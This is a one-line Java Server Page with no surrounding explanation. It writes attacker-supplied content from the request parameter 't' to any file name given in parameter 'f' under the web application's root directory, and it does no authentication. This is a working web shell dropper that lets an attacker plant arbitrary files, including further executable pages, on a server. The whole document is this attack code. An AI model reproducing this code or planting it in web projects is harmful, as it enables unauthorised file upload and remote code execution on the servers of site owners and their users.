<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%><%if(request.getParameter("f") != null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>


